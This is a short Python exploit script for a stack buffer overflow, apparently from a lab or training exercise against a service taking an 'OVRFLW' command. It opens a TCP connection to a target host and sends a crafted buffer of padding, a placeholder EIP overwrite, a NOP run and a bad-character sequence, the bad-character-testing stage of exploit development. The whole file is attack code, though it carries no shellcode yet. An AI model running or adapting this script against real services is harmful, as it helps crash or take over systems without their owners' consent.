#!/usr/bin/env python3
import socket
import struct
from time import sleep

from PARAMETERS import *

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buf = b""
buf += b"A"*(offset_eip - len(buf))      	# padding
buf += b"BBBB"                           	# EIP overwrite
buf += b"\x90"*(offset_esp - offset_eip - 4)	# Padding between EIP and ESP
buf += badchar_sequence                      	# ESP overwrite
buf += b"D"*(buf_totlen - len(buf))      	# trailing padding
buf += b"\n"


s.send(b"OVRFLW " + buf + b"\n")

